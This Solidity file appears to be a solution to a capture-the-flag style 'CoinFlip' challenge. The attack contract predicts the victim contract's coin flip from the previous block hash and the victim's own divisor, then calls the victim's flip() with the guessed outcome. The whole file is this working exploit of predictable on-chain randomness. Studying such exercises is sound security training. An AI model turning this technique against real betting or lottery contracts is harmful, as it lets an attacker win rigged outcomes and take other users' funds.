// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./coinflip.sol";

contract CoinFlipAttack {
    CoinFlip public vimctimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractaAddress) public{
        vimctimContract = CoinFlip(_victimContractaAddress);
    }

    function flip() public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = uint256(blockValue/FACTOR);
    bool side = coinFlip == 1 ? true : false;

    vimctimContract.flip(side);
    }

}
